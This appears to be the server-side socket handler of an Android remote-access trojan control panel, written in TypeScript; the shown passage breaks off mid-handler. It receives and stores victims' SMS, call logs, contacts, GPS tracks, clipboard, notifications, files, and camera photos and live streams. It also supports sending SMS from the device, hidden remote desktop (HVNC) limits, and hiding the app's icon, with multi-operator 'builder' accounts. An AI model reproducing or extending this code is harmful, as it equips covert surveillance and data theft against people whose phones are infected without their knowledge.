import type { Server as HttpServer } from 'http';
import type { Socket } from 'socket.io';
import { Server as SocketIOServer } from 'socket.io';
import type { FastifyInstance } from 'fastify';
import crypto from 'crypto';
import geoip from 'geoip-lite';
import { getDb, dbHelpers } from '../db/index.js';
import { clients } from '../db/schema.js';
import { eq, and, sql, lt } from 'drizzle-orm';
import { getConfig } from '../config/index.js';
import { CMD, CMD_TO_DATA_TYPE, type CmdType } from '../types/index.js';
import { getMimeType, normalizePermissions, normalizeDeviceInfo, normalizeCalls, normalizeContacts, normalizeFileList } from '../utils/helpers.js';
import { log } from '../utils/logger.js';
import { verifySessionToken } from '../middleware/auth.js';

const MAX_TRANSFER_TOTAL_SIZE = 100 * 1024 * 1024;
const MAX_TRANSFER_CHUNKS = 5000;
const MAX_TRANSFER_CHUNK_SIZE = 10 * 1024 * 1024;
const MAX_SINGLE_BUFFER_SIZE = 10 * 1024 * 1024;
const MAX_HVNC_BINARY_SIZE = 1 * 1024 * 1024;
const MAX_HVNC_TOTAL_SIZE = 4 * 1024 * 1024;
const MAX_HVNC_CHUNKS_PER_FRAME = 64;
const HVNC_RATE_LIMIT_PER_SEC = 120;

interface TransferChunk {
  transferId: string;
  name: string;
  path?: string;
  channel: string;
  totalChunks: number;
  totalSize: number;
  chunks: Map<number, Buffer>;
  receivedAt: number;
}

class SocketService {
  private io!: SocketIOServer;
  private fastifyApp!: FastifyInstance;
  private sockets: Map<string, Socket> = new Map();
  private gpsTimers: Map<string, NodeJS.Timeout> = new Map();
  private transfers: Map<string, TransferChunk> = new Map();
  private deviceOwners: Map<string, string> = new Map();
  private hvncRate: Map<string, { count: number; windowStart: number }> = new Map();

  initialize(httpServer: HttpServer, fastifyApp: FastifyInstance): void {
    const config = getConfig();
    this.fastifyApp = fastifyApp;
    this.io = new SocketIOServer(httpServer, {
      pingInterval: config.socket.pingInterval,
      pingTimeout: config.socket.pingTimeout,
      maxHttpBufferSize: config.socket.maxHttpBufferSize,
      transports: config.socket.transports as any,
      cors: config.socket.cors as any,
    });
    this.io.use(async (socket, next) => {
      const isPanel = socket.handshake.query.admin === 'true';
      if (isPanel) {
        const token = socket.handshake.auth?.token as string || socket.handshake.query.token as string;
        if (!token) return next(new Error('Authentication required'));
        try {
          const sessionUser = await verifySessionToken(token);
          if (!sessionUser) return next(new Error('Invalid or expired session'));
          (socket as any).panelUser = sessionUser;
        } catch {
          return next(new Error('Invalid token'));
        }
        return next();
      }
      const id = socket.handshake.query.id as string;
      if (!id) return next(new Error('Client ID required'));
      const clientToken = socket.handshake.query.token as string || socket.handshake.auth?.token as string;
      let matchedUserId: string | null = null;
      let authenticated = false;
      const userSecrets = dbHelpers.getAllDeviceSecrets();
      for (const { userId, deviceSecret } of userSecrets) {
        const a = Buffer.from(String(clientToken || ''));
        const b = Buffer.from(deviceSecret);
        if (a.length === b.length && a.length > 0 && crypto.timingSafeEqual(a, b)) {
          matchedUserId = userId;
          authenticated = true;
          break;
        }
      }
      if (!authenticated) {
        return next(new Error('Invalid device authentication token'));
      }
      (socket as any).builderUserId = matchedUserId;
      next();
    });
    this.io.on('connection', (socket) => {
      const isPanel = socket.handshake.query.admin === 'true';
      if (isPanel) {
        this.handlePanelConnection(socket);
      } else {
        this.handleConnection(socket);
      }
    });
  }

  private handlePanelConnection(socket: Socket): void {
    const user = (socket as any).panelUser;
    if (user.role === 'admin') {
      socket.join('admin');
    }
    socket.join(`user:${user.userId}`);
  }

  private handleConnection(socket: Socket): void {
    const id = socket.handshake.query.id as string;
    const model = socket.handshake.query.model as string || '';
    const manf = socket.handshake.query.manf as string || '';
    const release = socket.handshake.query.release as string || '';
    const builderUserId = (socket as any).builderUserId as string | null;
    const xff = socket.handshake.headers['x-forwarded-for'];
    const useXff = process.env.NODE_ENV === 'production' && !!xff;
    const rawIp = useXff
      ? (Array.isArray(xff) ? xff[0] : xff)
      : socket.handshake.address;
    const ip = (typeof rawIp === 'string' ? rawIp.split(',')[0] : String(rawIp)).trim();
    const geo = geoip.lookup(ip);
    const country = geo?.country || null;
    const city = geo?.city || null;
    const timezone = geo?.timezone || null;
    const oldSocket = this.sockets.get(id);
    if (oldSocket && oldSocket !== socket) {
      oldSocket.removeAllListeners('disconnect');
      oldSocket.disconnect(true);
    }
    const d = getDb();
    const existing = d.select().from(clients).where(eq(clients.id, id)).get();
    if (existing?.ownerId && builderUserId && existing.ownerId !== builderUserId) {
      log.warn(`Socket: Rejecting device ${id}: owner: ${existing.ownerId}, token: ${builderUserId}`);
      socket.disconnect(true);
      return;
    }
    if (existing) {
      const updates: Record<string, unknown> = {
        ip, country, city, timezone,
        lastSeen: new Date().toISOString(),
        online: true,
        reconnectCount: sql`${clients.reconnectCount} + 1`,
        deviceModel: model, deviceBrand: manf, deviceVersion: release,
      };
      if (builderUserId && !existing.ownerId) {
        updates.ownerId = builderUserId;
      }
      d.update(clients).set(updates).where(eq(clients.id, id)).run();
      this.ensureClientData(id);
    } else {
      d.insert(clients).values({
        id, ip, country, city, timezone, online: true,
        ownerId: builderUserId || null,
        deviceModel: model, deviceBrand: manf, deviceVersion: release,
      }).run();
      this.ensureClientData(id);
    }
    this.sockets.set(id, socket);
    dbHelpers.addLog('CONNECTION', 'CLIENT', `Client ${id} connected from ${ip}`, JSON.stringify({ ip, country, city, model, manf }));
    this.io.to('admin').emit('client:connect', { id, model, ip });
    const connectOwnerId = dbHelpers.getDeviceOwnerId(id);
    if (connectOwnerId) {
      this.deviceOwners.set(id, connectOwnerId);
      this.io.to(`user:${connectOwnerId}`).emit('client:connect', { id, model, ip });
    }
    this.runQueuedCommands(id);
    this.restoreGpsPolling(id);
    this.setupHandlers(socket, id);
    socket.on('disconnect', () => this.handleDisconnect(id, socket));
    socket.on('error', (err) => { log.error(`Socket err: ${id}: ${err instanceof Error ? err.message : String(err)}`); });
  }

  private handleDisconnect(id: string, socket: Socket): void {
    if (this.sockets.get(id) !== socket) return;
    const d = getDb();
    d.update(clients).set({ online: false, lastSeen: new Date().toISOString() }).where(eq(clients.id, id)).run();
    this.sockets.delete(id);
    this.deviceOwners.delete(id);
    this.hvncRate.delete(id);
    const timer = this.gpsTimers.get(id);
    if (timer) { clearInterval(timer); this.gpsTimers.delete(id); }
    for (const [transferId, transfer] of this.transfers) {
      if (transferId.startsWith(id + ':')) this.transfers.delete(transferId);
    }
    dbHelpers.addLog('DISCONNECTION', 'CLIENT', `Client ${id} disconnected`);
    dbHelpers.setClientData(id, 'notification_status', JSON.stringify(null));
    dbHelpers.setClientData(id, 'mic_status', JSON.stringify(null));
    dbHelpers.setClientData(id, 'wifi_error', JSON.stringify(null));
    this.io.to('admin').emit('client:disconnect', { id });
    const disconnectOwnerId = dbHelpers.getDeviceOwnerId(id);
    if (disconnectOwnerId) this.io.to(`user:${disconnectOwnerId}`).emit('client:disconnect', { id });
  }

  private ensureClientData(clientId: string): void {
    const dataTypes = ['sms', 'calls', 'contacts', 'wifi', 'wifi_error', 'clipboard', 'notifications', 'notification_status', 'permissions', 'apps', 'gps', 'files', 'file_error', 'cameras', 'mic_status', 'queue'];
    for (const type of dataTypes) dbHelpers.getOrCreateClientData(clientId, type);
  }

  private saveFileToDb(clientId: string, fileType: string, buffer: Buffer, originalName: string): void {
    dbHelpers.addClientFile(clientId, fileType, originalName, getMimeType(originalName), buffer, buffer.length);
  }

  private completeTransfer(id: string, transfer: TransferChunk, fileType: string, dataType: string): void {
    const buffer = Buffer.concat(Array.from(transfer.chunks.entries()).sort(([a], [b]) => a - b).map(([, chunk]) => chunk));
    this.saveFileToDb(id, fileType, buffer, transfer.name);
    dbHelpers.addLog('DATA', dataType, `${dataType} (chunked) from ${id}`, JSON.stringify({ size: buffer.length, name: transfer.name }));
    this.transfers.delete(`${id}:${transfer.transferId}`);
    const dataTypeLower = dataType.toLowerCase();
    const ownerId = dbHelpers.getDeviceOwnerId(id);
    if (ownerId) {
      this.io.to('admin').to(`user:${ownerId}`).emit('client:data', { id, dataType: dataTypeLower });
    } else {
      this.io.to('admin').emit('client:data', { id, dataType: dataTypeLower });
    }
  }

  private validateTransferStart(totalChunks: number, totalSize: number): boolean {
    if (totalSize < 0 || totalSize > MAX_TRANSFER_TOTAL_SIZE) return false;
    if (totalChunks <= 0 || totalChunks > MAX_TRANSFER_CHUNKS) return false;
    return true;
  }

  private validateTransferChunk(chunkData: string): boolean {
    const decodedSize = Math.ceil(chunkData.length * 0.75);
    return decodedSize <= MAX_TRANSFER_CHUNK_SIZE;
  }

  private markCommandResponded(clientId: string, cmdType: CmdType, summary?: string): void {
    const ids = dbHelpers.markAllPendingCommandsResponded(clientId, cmdType, summary);
    for (const id of ids) {
      // FIX: include summary in the broadcast so the frontend can surface
      // device-side error details (e.g., "SMS failed: No SIM") and success
      // summaries (e.g., "3 messages"). Previously the summary was stored
      // in the DB but dropped from the socket event.
      this.broadcastToDeviceOwner(clientId, 'client:command', { id: clientId, commandId: id, status: 'responded', dataType: CMD_TO_DATA_TYPE[cmdType], summary });
    }
  }

  private setupHandlers(socket: Socket, id: string): void {
    const d = getDb();
    const broadcastData = (dataType: string) => {
      this.io.to('admin').emit('client:data', { id, dataType });
      const ownerId = dbHelpers.getDeviceOwnerId(id);
      if (ownerId) this.io.to(`user:${ownerId}`).emit('client:data', { id, dataType });
    };
    socket.on(CMD.SMS, (data: any) => {
      try {
        if (data.smslist) {
          const normalizedSms = (data.smslist as any[]).map((sms: any) => ({
            ...sms,
            date: typeof sms.date === 'string' && /^\d+$/.test(sms.date)
              ? new Date(parseInt(sms.date)).toISOString()
              : (sms.date || new Date().toISOString()),
            type: typeof sms.type === 'number' ? sms.type : (typeof sms.type === 'string' ? parseInt(sms.type) || 0 : 0),
          }));
          dbHelpers.setClientData(id, 'sms', JSON.stringify(normalizedSms));
          dbHelpers.addLog('DATA', 'SMS', `SMS data received from ${id}`, JSON.stringify({ count: data.total || data.smslist.length }));
          this.markCommandResponded(id, CMD.SMS, `${data.total || data.smslist.length} messages`);
          broadcastData('sms');
        }
        if (data.action === 'sendSMS' && data.success) {
          const to = String(data.to || '');
          const body = String(data.sms || data.body || data.message || '');
          if (to) {
            try {
              const smsData = JSON.parse(dbHelpers.getOrCreateClientData(id, 'sms'));
              if (Array.isArray(smsData)) {
                smsData.unshift({ address: to, body, date: new Date().toISOString(), type: 2 });
                if (smsData.length > 500) smsData.splice(500);
                dbHelpers.setClientData(id, 'sms', JSON.stringify(smsData));
                broadcastData('sms');
              }
            } catch (persistErr: unknown) {
              log.error(`SMS persist failed: ${id}: ${persistErr instanceof Error ? persistErr.message : String(persistErr)}`);
            }
          }
          dbHelpers.addLog('COMMAND', 'SMS', `SMS sent from ${id}`);
          this.markCommandResponded(id, CMD.SMS, 'SMS sent');
        }
        if (data.action === 'sendSMS' && data.error) {
          dbHelpers.addLog('ERROR', 'SMS', `SMS send failed from ${id}: ${data.error}`);
          this.markCommandResponded(id, CMD.SMS, `SMS failed: ${data.error}`);
          this.broadcastToDeviceOwner(id, 'client:data', { id, dataType: 'sms_status', status: 'error', error: data.error });
        }
      } catch (err: unknown) { log.error(`SMS: ${err instanceof Error ? err.message : String(err)}`); }
    });
    socket.on(CMD.CALLS, (data: any) => {
      try {
        if (data.callsList) {
          const normalized = normalizeCalls(data);
          dbHelpers.setClientData(id, 'calls', JSON.stringify(normalized));
          dbHelpers.addLog('DATA', 'CALLS', `Call logs received from ${id}`, JSON.stringify({ count: data.total || data.callsList.length }));
          this.markCommandResponded(id, CMD.CALLS, `${data.total || data.callsList.length} calls`);
          broadcastData('calls');
        }
      } catch (err: unknown) { log.error(`Calls: ${err instanceof Error ? err.message : String(err)}`); }
    });
    socket.on(CMD.CONTACTS, (data: any) => {
      try {
        if (data.contactsList) {
          const normalized = normalizeContacts(data);
          dbHelpers.setClientData(id, 'contacts', JSON.stringify(normalized));
          dbHelpers.addLog('DATA', 'CONTACTS', `Contacts received from ${id}`, JSON.stringify({ count: data.total || data.contactsList.length }));
          this.markCommandResponded(id, CMD.CONTACTS, `${data.total || data.contactsList.length} contacts`);
          broadcastData('contacts');
        }
      } catch (err: unknown) { log.error(`Contacts: ${err instanceof Error ? err.message : String(err)}`); }
    });
    socket.on(CMD.LOCATION, (data: any) => {
      try {
        const locList = Array.isArray(data.locations) ? data.locations
          : Array.isArray(data.locationList) ? data.locationList
          : null;
        if (locList && locList.length > 0) {
          const gpsData = JSON.parse(dbHelpers.getOrCreateClientData(id, 'gps'));
          for (const loc of locList) {
            const lat = Number(loc.latitude);
            const lng = Number(loc.longitude);
            if (!Number.isFinite(lat) || !Number.isFinite(lng)) continue;
            const rawTime = loc.timestamp || loc.time || Date.now();
            gpsData.push({
              latitude: lat, longitude: lng, accuracy: loc.accuracy,
              speed: loc.speed, provider: loc.provider,
              time: typeof rawTime === 'number' ? new Date(rawTime).toISOString() : String(rawTime),
            });
          }
          if (gpsData.length > 500) gpsData.splice(0, gpsData.length - 500);
          dbHelpers.setClientData(id, 'gps', JSON.stringify(gpsData));
          dbHelpers.addLog('DATA', 'GPS', `GPS locations from ${id}`, JSON.stringify({ count: locList.length }));
          this.markCommandResponded(id, CMD.LOCATION, `${locList.length} locations`);
          broadcastData('gps');
          return;
        }
        if (data.enabled === false || (data.latitude === undefined && data.longitude === undefined)) {
          dbHelpers.addLog('DATA', 'GPS', `GPS unavailable from ${id}: ${data.error || 'No location'}`);
          this.markCommandResponded(id, CMD.LOCATION, data.error || 'No location');
          broadcastData('gps');
          return;
        }
        const lat = Number(data.latitude);
        const lng = Number(data.longitude);
        if (!Number.isFinite(lat) || !Number.isFinite(lng) || lat < -90 || lat > 90 || lng < -180 || lng > 180) {
          dbHelpers.addLog('ERROR', 'GPS', `Invalid GPS data from ${id}: lat=${data.latitude}, lng=${data.longitude}`);
          this.markCommandResponded(id, CMD.LOCATION, 'Invalid location data');
          return;
        }
        const gpsData = JSON.parse(dbHelpers.getOrCreateClientData(id, 'gps'));
        if (gpsData.length > 0) {
          const last = gpsData[gpsData.length - 1];
          const dist = Math.sqrt(Math.pow(lat - last.latitude, 2) + Math.pow(lng - last.longitude, 2)) * 111000;
          const ageMs = Date.now() - new Date(last.time).getTime();
          if (dist < 5 && ageMs < 10000) {
            this.markCommandResponded(id, CMD.LOCATION, `${lat.toFixed(4)}, ${lng.toFixed(4)}`);
            broadcastData('gps');
            return;
          }
        }
        const rawTime = data.timestamp || data.time || Date.now();
        const isoTime = typeof rawTime === 'number' ? new Date(rawTime).toISOString() : String(rawTime);
        const entry: Record<string, unknown> = {
          latitude: lat, longitude: lng, accuracy: data.accuracy,
          speed: data.speed, provider: data.provider, time: isoTime,
        };
        if (data.altitude != null) entry.altitude = data.altitude;
        if (data.bearing != null) entry.bearing = data.bearing;
        if (data.isMock === true) entry.isMock = true;
        gpsData.push(entry);
        const MAX_GPS_ENTRIES = 500;
        if (gpsData.length > MAX_GPS_ENTRIES) {
          gpsData.splice(0, gpsData.length - MAX_GPS_ENTRIES);
        }
        dbHelpers.setClientData(id, 'gps', JSON.stringify(gpsData));
        d.update(clients).set({
          lastSeen: new Date().toISOString(),
        }).where(eq(clients.id, id)).run();
        dbHelpers.addLog('DATA', 'GPS', `GPS location from ${id}`, JSON.stringify({ lat, lng }));
        this.markCommandResponded(id, CMD.LOCATION, `${lat.toFixed(4)}, ${lng.toFixed(4)}`);
        broadcastData('gps');
      } catch (err: unknown) { log.error(`GPS: ${err instanceof Error ? err.message : String(err)}`); }
    });
    socket.on(CMD.WIFI, (data: any) => {
      try {
        const networks = data.networks || data.wifiList || data.list;
        if (networks) {
          dbHelpers.setClientData(id, 'wifi', JSON.stringify(networks));
          dbHelpers.setClientData(id, 'wifi_error', JSON.stringify(null));
          dbHelpers.addLog('DATA', 'WIFI', `WiFi data from ${id}`, JSON.stringify({ count: data.total || networks.length }));
          this.markCommandResponded(id, CMD.WIFI, `${data.total || networks.length} networks`);
          broadcastData('wifi');
        }
        if (data.error) {
          dbHelpers.setClientData(id, 'wifi', JSON.stringify([]));
          dbHelpers.setClientData(id, 'wifi_error', JSON.stringify({ error: data.error, timestamp: Date.now() }));
          dbHelpers.addLog('ERROR', 'WIFI', `WiFi scan error from ${id}: ${data.error}`);
          this.markCommandResponded(id, CMD.WIFI, data.error);
          broadcastData('wifi');
        }
      } catch (err: unknown) { log.error(`WiFi: ${err instanceof Error ? err.message : String(err)}`); }
    });
    socket.on(CMD.NOTIFICATIONS, (data: any) => {
      try {
        if (data.enabled !== undefined) {
          dbHelpers.setClientData(id, 'notification_status', JSON.stringify({ enabled: data.enabled, connected: !!data.connected }));
          this.markCommandResponded(id, CMD.NOTIFICATIONS, data.enabled ? 'Enabled' : 'Disabled');
          broadcastData('notifications');
        }
        if (data.notificationStatus) {
          dbHelpers.setClientData(id, 'notification_status', JSON.stringify({
            enabled: data.notificationStatus.enabled !== undefined ? data.notificationStatus.enabled : true,
            connected: data.notificationStatus.connected !== undefined ? data.notificationStatus.connected : true,
          }));
          broadcastData('notifications');
        }
        const notifList = Array.isArray(data.notifications) ? data.notifications
          : Array.isArray(data.list) ? data.list
          : null;
        if (notifList) {
          const notifications = JSON.parse(dbHelpers.getOrCreateClientData(id, 'notifications'));
          for (const n of notifList) {
            const rawTs = n.timestamp || n.postTime || Date.now();
            const tsStr = typeof rawTs === 'number' ? new Date(rawTs).toISOString() : String(rawTs);
            notifications.push({
              appName: n.appName, title: n.title,
              content: n.content, timestamp: tsStr,
              ongoing: n.ongoing, clearable: n.clearable,
              category: n.category, initial: n.initial,
            });
          }
          if (notifications.length > 500) notifications.splice(0, notifications.length - 500);
          dbHelpers.setClientData(id, 'notifications', JSON.stringify(notifications));
          dbHelpers.addLog('DATA', 'NOTIFICATIONS', `${notifList.length} notifications from ${id}`);
          broadcastData('notifications');
          return;
        }
        const notification = data;
        if ((notification.appName || notification.title) && !data.enabled && !data.removed) {
          const notifications = JSON.parse(dbHelpers.getOrCreateClientData(id, 'notifications'));
          const rawTs = notification.timestamp || notification.postTime || Date.now();
          const tsStr = typeof rawTs === 'number' ? new Date(rawTs).toISOString() : String(rawTs);
          const notifId = notification.id != null ? String(notification.id) : '';
          const notifPkg = notification.packageName || notification.appName || '';
          const isDuplicate = notifId && notifPkg && Array.isArray(notifications) &&
            notifications.some((n: any) =>
              String(n.id || '') === notifId &&
              (n.packageName || n.appName) === notifPkg
            );
          if (!isDuplicate) {
            notifications.push({
              id: notifId || undefined,
              packageName: notifPkg || undefined,
              appName: notification.appName, title: notification.title,
              content: notification.content, timestamp: tsStr,
              ongoing: notification.ongoing, clearable: notification.clearable,
              category: notification.category, initial: notification.initial,
            });
            if (notifications.length > 500) notifications.splice(0, notifications.length - 500);
            dbHelpers.setClientData(id, 'notifications', JSON.stringify(notifications));
            dbHelpers.addLog('DATA', 'NOTIFICATIONS', `Notification from ${id}`);
            broadcastData('notifications');
          }
        }
        if (data.removed) {
          dbHelpers.addLog('DATA', 'NOTIFICATIONS', `Notification removed on ${id}: ${data.packageName || 'unknown'}`);
          try {
            const notifications = JSON.parse(dbHelpers.getOrCreateClientData(id, 'notifications'));
            if (Array.isArray(notifications) && notifications.length > 0) {
              const removedTime = data.postTime || data.timestamp || Date.now();
              const removedId = data.id != null ? String(data.id) : '';
              const removedPkg = data.packageName || '';
              const filtered = notifications.filter((n: any) => {
                if (removedId && removedPkg && String(n.id || '') === removedId && (n.packageName || n.appName) === removedPkg) {
                  return false;
                }
                if (!removedId && n.appName === data.packageName) {
                  const notifTime = n.timestamp ? new Date(n.timestamp).getTime() : 0;
                  if (Math.abs(notifTime - removedTime) < 5000) return false;
                }
                return true;
              });
              if (filtered.length < notifications.length) {
                dbHelpers.setClientData(id, 'notifications', JSON.stringify(filtered));
                broadcastData('notifications');
              }
            }
          } catch (persistErr: unknown) {
            log.error(`Notif remove failed: ${id}: ${persistErr instanceof Error ? persistErr.message : String(persistErr)}`);
          }
        }
      } catch (err: unknown) { log.error(`Notif: ${err instanceof Error ? err.message : String(err)}`); }
    });
    socket.on(CMD.CLIPBOARD, (data: any) => {
      try {
        const clipboard = JSON.parse(dbHelpers.getOrCreateClientData(id, 'clipboard'));
        const items = Array.isArray(data.clipboardList) ? data.clipboardList
          : Array.isArray(data.list) ? data.list
          : null;
        if (items) {
          for (const item of items) {
            const text = item.text || item.content || '';
            if (!text || text.trim().length === 0) continue;
            clipboard.push({
              text,
              length: item.length || text.length,
              label: item.label, mimeType: item.mimeType,
              timestamp: typeof (item.timestamp || item.time) === 'number'
                ? new Date(item.timestamp || item.time).toISOString()
                : (item.timestamp || item.time || new Date().toISOString()),
            });
          }
        } else {
          const text = data.text || data.content || '';
          if (text && text.trim().length > 0) {
            clipboard.push({
              text,
              length: data.length || text.length,
              label: data.label, mimeType: data.mimeType,
              timestamp: data.timestamp || data.time || new Date().toISOString(),
            });
          }
        }
        if (clipboard.length > 200) clipboard.splice(0, clipboard.length - 200);
        dbHelpers.setClientData(id, 'clipboard', JSON.stringify(clipboard));
        dbHelpers.addLog('DATA', 'CLIPBOARD', `Clipboard data from ${id}`);
        this.markCommandResponded(id, CMD.CLIPBOARD, 'Clipboard updated');
        broadcastData('clipboard');
      } catch (err: unknown) { log.error(`Clipboard: ${err instanceof Error ? err.message : String(err)}`); }
    });
    socket.on(CMD.APPS, (data: any) => {
      try {
        const apps = data.apps || data.appsList || data.list;
        if (apps) {
          const normalized = Array.isArray(apps) ? apps : [];
          dbHelpers.setClientData(id, 'apps', JSON.stringify(normalized));
          dbHelpers.addLog('DATA', 'APPS', `Apps list from ${id}`, JSON.stringify({ count: data.total || normalized.length }));
          this.markCommandResponded(id, CMD.APPS, `${data.total || normalized.length} apps`);
          broadcastData('apps');
        }
      } catch (err: unknown) { log.error(`Apps: ${err instanceof Error ? err.message : String(err)}`); }
    });
    socket.on(CMD.PERMISSIONS, (data: any) => {
      try {
        const perms = normalizePermissions(data);
        dbHelpers.setClientData(id, 'permissions', JSON.stringify(perms));
        dbHelpers.addLog('DATA', 'PERMISSIONS', `Permissions from ${id}`, JSON.stringify({ count: perms.length }));
        this.markCommandResponded(id, CMD.PERMISSIONS, `${perms.length} permissions`);
        broadcastData('permissions');
      } catch (err: unknown) { log.error(`Permissions: ${err instanceof Error ? err.message : String(err)}`); }
    });
    socket.on(CMD.PERM_CHECK, (data: any) => {
      try {
        const perms = JSON.parse(dbHelpers.getOrCreateClientData(id, 'permissions'));
        const idx = perms.findIndex((p: any) => p.permission === data.permission);
        if (idx >= 0) perms[idx].allowed = data.allowed;
        else perms.push({ permission: data.permission, allowed: data.allowed });
        dbHelpers.setClientData(id, 'permissions', JSON.stringify(perms));
        this.markCommandResponded(id, CMD.PERM_CHECK, `${data.permission}: ${data.allowed ? 'granted' : 'denied'}`);
        broadcastData('permissions');
      } catch (err: unknown) { log.error(`PermCheck: ${err instanceof Error ? err.message : String(err)}`); }
    });
    socket.on(CMD.INFO, (data: Record<string, unknown>) => {
      try {
        const normalized = normalizeDeviceInfo(data);
        const updates: Record<string, unknown> = { deviceInfo: JSON.stringify(normalized) };
        if (data.model || data.brand) {
          updates.deviceModel = data.model as string;
          updates.deviceBrand = data.brand as string;
          updates.deviceVersion = (data.androidVersion || data.version) as string;
        }
        d.update(clients).set(updates).where(eq(clients.id, id)).run();
        dbHelpers.addLog('DATA', 'DEVICE', `Device info from ${id}`);
        this.markCommandResponded(id, CMD.INFO, 'Device info updated');
        this.broadcastToDeviceOwner(id, 'client:update', { id, dataType: 'info' });
      } catch (err: unknown) { log.error(`Info: ${err instanceof Error ? err.message : String(err)}`); }
    });
    socket.on(CMD.FASON, (data: any) => {
      try {
        const hidden = !!data.hidden;
        d.update(clients).set({ fasonHidden: hidden }).where(eq(clients.id, id)).run();
        dbHelpers.addLog('DATA', 'FASON', `App ${hidden ? 'hidden' : 'shown'} on ${id}`);
        this.markCommandResponded(id, CMD.FASON, hidden ? 'Hidden' : 'Shown');
        this.broadcastToDeviceOwner(id, 'client:update', { id, dataType: 'fason' });
      } catch (err: unknown) { log.error(`Fason: ${err instanceof Error ? err.message : String(err)}`); }
    });
    socket.on(CMD.CAMERA, (data: any) => {
      try {
        const camList = data.camList || (Array.isArray(data.cameras) ? data.cameras : null);
        if (camList) {
          const camData = Array.isArray(data.list) ? data.list : camList;
          d.update(clients).set({ cameraPermission: data.hasPermission !== undefined ? !!data.hasPermission : (data.permission !== undefined ? !!data.permission : true) }).where(eq(clients.id, id)).run();
          dbHelpers.setClientData(id, 'cameras', JSON.stringify(camData));
          dbHelpers.addLog('DATA', 'CAMERA', `Camera list from ${id}`, JSON.stringify({ count: camData.length }));
          this.markCommandResponded(id, CMD.CAMERA, `${camData.length} cameras`);
          broadcastData('camera');
        } else if (data.type === 'download_start') {
          if (!this.validateTransferStart(data.totalChunks, data.totalSize)) { log.warn(`Socket: Camera transfer too large: ${id}`); return; }
          this.transfers.set(`${id}:${data.transferId}`, {
            transferId: data.transferId, name: data.name || `capture_${Date.now()}.jpg`,
            channel: CMD.CAMERA, totalChunks: data.totalChunks, totalSize: data.totalSize,
            chunks: new Map(), receivedAt: Date.now(),
          });
          this.broadcastToDeviceOwner(id, 'client:transfer', { id, transferId: data.transferId, name: data.name, totalChunks: data.totalChunks, totalSize: data.totalSize, progress: 0 });
        } else if (data.type === 'download_chunk') {
          const transferId = `${id}:${data.transferId}`;
          const transfer = this.transfers.get(transferId);
          if (transfer) {
            if (!this.validateTransferChunk(data.chunkData)) { log.warn(`Socket: Camera chunk too large: ${id}`); this.transfers.delete(transferId); return; }
            transfer.chunks.set(data.chunkIndex, Buffer.from(data.chunkData, 'base64'));
            const progress = Math.round((transfer.chunks.size / transfer.totalChunks) * 100);
            this.broadcastToDeviceOwner(id, 'client:transfer', { id, transferId: data.transferId, name: transfer.name, totalChunks: transfer.totalChunks, totalSize: transfer.totalSize, progress });
            if (transfer.chunks.size === transfer.totalChunks) {
              const isVideo = transfer.name && transfer.name.endsWith('.mp4');
              this.completeTransfer(id, transfer, isVideo ? 'video' : 'photo', 'CAMERA');
              this.markCommandResponded(id, CMD.CAMERA, isVideo ? 'Video recorded' : 'Photo captured');
            }
          }
        } else if (data.type === 'download_end') {
          this.transfers.delete(`${id}:${data.transferId}`);
          if (data.error) {
            dbHelpers.addLog('ERROR', 'CAMERA', `Camera transfer failed from ${id}: ${data.error}`);
            this.markCommandResponded(id, CMD.CAMERA, `Transfer failed: ${data.error}`);
          }
        } else if (data.streamFrame === true) {
          if (data.status === 'streaming' || data.status === 'stopped') {
            this.broadcastToDeviceOwner(id, 'client:data', { id, dataType: 'camera', streamStatus: data.status, cameraId: data.cameraId });
            if (data.status === 'streaming') {
              this.markCommandResponded(id, CMD.CAMERA, 'Stream started');
            } else {
              this.markCommandResponded(id, CMD.CAMERA, 'Stream stopped');
            }
          } else if (typeof data.buffer === 'string') {
            if (data.buffer.length > MAX_SINGLE_BUFFER_SIZE * 1.34) return;
            this.broadcastToDeviceOwnerBinary(id, 'client:camera_stream', { id, cameraId: data.cameraId, timestamp: data.timestamp }, Buffer.from(data.buffer, 'base64'));
          }
        } else if (data.status === 'recording') {
          dbHelpers.addLog('DATA', 'CAMERA', `Video recording started from ${id}`, JSON.stringify({ cameraId: data.cameraId }));
          this.broadcastToDeviceOwner(id, 'client:data', { id, dataType: 'camera', videoStatus: 'recording', cameraId: data.cameraId });
        } else if (data.status === 'stopped') {
          dbHelpers.addLog('DATA', 'CAMERA', `Video recording stopped from ${id}`);
          this.broadcastToDeviceOwner(id, 'client:data', { id, dataType: 'camera', videoStatus: 'stopped' });
        } else if (data.image === false && data.error) {
          dbHelpers.addLog('ERROR', 'CAMERA', `Camera error from ${id}: ${data.error}`);
          this.markCommandResponded(id, CMD.CAMERA, data.error);
          this.broadcastToDeviceOwner(id, 'client:data', { id, dataType: 'camera', videoStatus: 'error', cameraId: data.cameraId, error: data.error });
        } else if (typeof data.buffer === 'string' && data.buffer.length > 0) {
          if (data.buffer.length > MAX_SINGLE_BUFFER_SIZE * 1.34) { log.warn(`Socket: Camera buffer too large: ${id}`); return; }
          const buffer = Buffer.from(data.buffer, 'base64');
          const fileName = data.name || `capture_${Date.now()}.jpg`;
          const isVideo = fileName.endsWith('.mp4');
          this.saveFileToDb(id, isVideo ? 'video' : 'photo', buffer, fileName);
          dbHelpers.addLog('DATA', 'CAMERA', `${isVideo ? 'Video' : 'Photo'} captured from ${id}`, JSON.stringify({ size: buffer.length }));
          this.markCommandResponded(id, CMD.CAMERA, isVideo ? 'Video captured' : 'Photo captured');
          broadcastData('camera');
        }
      } catch (err: unknown) { log.error(`Camera: ${err instanceof Error ? err.message : String(err)}`); }
    });
    socket.on(CMD.FILES, (data: any) => {
      try {
        if (data.type === 'list' || (Array.isArray(data.list) && !data.type)) {
          const normalizedList = normalizeFileList(data.list || []);
          dbHelpers.setClientData(id, 'files', JSON.stringify(normalizedList));
          d.update(clients).set({ currentPath: data.path || '' }).where(eq(clients.id, id)).run();
          dbHelpers.setClientData(id, 'file_error', JSON.stringify(null));
          dbHelpers.addLog('DATA', 'FILES', `File list from ${id}`, JSON.stringify({ path: data.path, count: normalizedList.length }));
          this.markCommandResponded(id, CMD.FILES, `${normalizedList.length} files`);
          broadcastData('files');
        } else if (data.type === 'download') {
          if (typeof data.buffer !== 'string' || data.buffer.length === 0) return;
          if (data.buffer.length > MAX_SINGLE_BUFFER_SIZE * 1.34) { log.warn(`Socket: File buffer too large: ${id}`); return; }
          const buffer = Buffer.from(data.buffer, 'base64');
          this.saveFileToDb(id, 'download', buffer, data.name || 'download');
          dbHelpers.addLog('DATA', 'FILES', `File downloaded from ${id}: ${data.name}`, JSON.stringify({ size: buffer.length }));
          this.markCommandResponded(id, CMD.FILES, `Downloaded: ${data.name}`);
